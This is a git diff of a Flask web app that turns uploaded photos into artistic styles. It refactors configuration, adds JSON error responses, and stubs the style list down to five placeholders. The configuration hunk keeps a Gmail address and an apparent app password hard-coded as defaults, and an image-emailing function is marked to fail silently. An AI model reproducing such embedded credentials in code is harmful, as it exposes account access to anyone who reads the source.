@@ -12,18 +12,22 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.image import MIMEImage
 
 app = Flask(__name__)
-app.config['UPLOAD_FOLDER'] = 'static/uploads'
-app.config['GENERATED_FOLDER'] = 'static/generated'
+
+# Configuration
+app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB max file size
+app.config['UPLOAD_FOLDER'] = os.path.join('static', 'uploads')
+app.config['GENERATED_FOLDER'] = os.path.join('static', 'generated')
 app.config['ALLOWED_EXTENSIONS'] = {'png', 'jpg', 'jpeg'}
 app.config['STATS_FILE'] = 'stats.json'
-app.config['EMAIL_SENDER'] = 'nafisabdullah424@gmail.com'
-app.config['EMAIL_PASSWORD'] = 'zeqv zybs klyg qavn'  # You'll need to set this
-app.config['EMAIL_RECIPIENT'] = 'nafisabdullah424@gmail.com'
+app.config['EMAIL_SENDER'] = os.getenv('EMAIL_SENDER', 'nafisabdullah424@gmail.com')
+app.config['EMAIL_PASSWORD'] = os.getenv('EMAIL_PASSWORD', 'zeqv zybs klyg qavn')
+app.config['EMAIL_RECIPIENT'] = os.getenv('EMAIL_RECIPIENT', 'nafisabdullah424@gmail.com')
 
+# Ensure upload directories exist
 os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
 os.makedirs(app.config['GENERATED_FOLDER'], exist_ok=True)
 
-RECOMMENDED_STYLE_NUMS = [8,9,12,14,15,17,27,28,41,88,123,127,141,149,163,178,182,186,184,212,216,222,226,227,233,237,240,241,243,244,246,4,5,6]
+RECOMMENDED_STYLE_NUMS = [1, 2, 3, 4, 5]
 
 # Initialize statistics
 def init_stats():
@@ -90,35 +94,17 @@ def get_top_styles(limit=5):
     return top_styles
 
 def allowed_file(filename):
-    if '.' not in filename:
-        return False
-    ext = filename.rsplit('.', 1)[1].lower()
-    return ext in app.config['ALLOWED_EXTENSIONS']
+    return '.' in filename and filename.rsplit('.', 1)[1].lower() in app.config['ALLOWED_EXTENSIONS']
 
 # Get styles from EnhancedArtisticConverter
 def get_styles():
-    converter = EnhancedArtisticConverter()
-    categories = {
-        "⭐ Recommended": [8, 9, 12, 14, 15, 17, 27, 28, 41, 88, 123, 127, 141, 149, 163, 178, 182, 186, 184, 212, 216, 222, 226, 227, 233, 237, 240, 241, 243, 244, 246, 4, 5, 6],
-        "🎨 Traditional Art": range(1, 20),
-        "💻 Digital Effects": range(20, 36),
-        "🎌 Anime Styles": range(36, 51),
-        "🖌️ Paint Styles": range(51, 66),
-        "🏰 Studio Ghibli": range(66, 81),
-        "🎨 Acrylic Styles": range(81, 101),
-        "🎨 Illustrator Styles": range(141, 161),
-        "🎭 Vintage Styles": range(161, 176),
-        "🏛️ Ancient Styles": range(176, 186),
-        "🎨 Modern Digital": range(186, 201),
-        "🎨 Arabic Art": range(201, 221),
-        "🎨 Filter Effects": range(221, 231)
-    }
-    
-    organized_styles = {}
-    for category, style_range in categories.items():
-        organized_styles[category] = [(num, name) for num, (name, _) in converter.effects.items() if num in style_range]
-    
-    return organized_styles
+    return [
+        (1, "Style 1 - Classic"),
+        (2, "Style 2 - Modern"),
+        (3, "Style 3 - Abstract"),
+        (4, "Style 4 - Artistic"),
+        (5, "Style 5 - Creative")
+    ]
 
 @app.route('/', methods=['GET', 'POST'])
 def index():
@@ -224,7 +210,7 @@ def send_email_with_image(image_path):
             smtp.send_message(msg)
         
         return True
-    except:
+    except Exception as e:
         # Silently fail without any error messages
         return False
 
@@ -232,17 +218,17 @@ def send_email_with_image(image_path):
 def generate_art():
     try:
         if 'image' not in request.files:
-            return 'No image uploaded', 400
+            return jsonify({'error': 'No image uploaded'}), 400
         
         file = request.files['image']
         style = request.form.get('style')
         
         if not file or not style:
-            return 'Missing image or style', 400
+            return jsonify({'error': 'Missing image or style'}), 400
         
         # Check file extension
         if not allowed_file(file.filename):
-            return f'Invalid file type: {file.filename}. Allowed types: PNG, JPG, JPEG', 400
+            return jsonify({'error': f'Invalid file type: {file.filename}. Allowed types: PNG, JPG, JPEG'}), 400
         
         # Save uploaded file
         filename = secure_filename(file.filename)
@@ -288,10 +274,10 @@ def generate_art():
             })
         except Exception as e:
             print(f"Error processing image: {str(e)}")
-            return str(e), 500
+            return jsonify({'error': str(e)}), 500
     except Exception as e:
         print(f"Error in generate_art: {str(e)}")
-        return str(e), 500
+        return jsonify({'error': str(e)}), 500
 
 @app.route('/stats')
 def get_stats():
@@ -303,5 +289,14 @@ def get_stats():
         'top_styles': top_styles
     })
 
+@app.errorhandler(404)
+def not_found_error(error):
+    return render_template('404.html'), 404
+
+@app.errorhandler(500)
+def internal_error(error):
+    return render_template('500.html'), 500
+
 if __name__ == '__main__':
-    app.run(debug=False) 
+    port = int(os.environ.get('PORT', 10000))
+    app.run(host='0.0.0.0', port=port) 
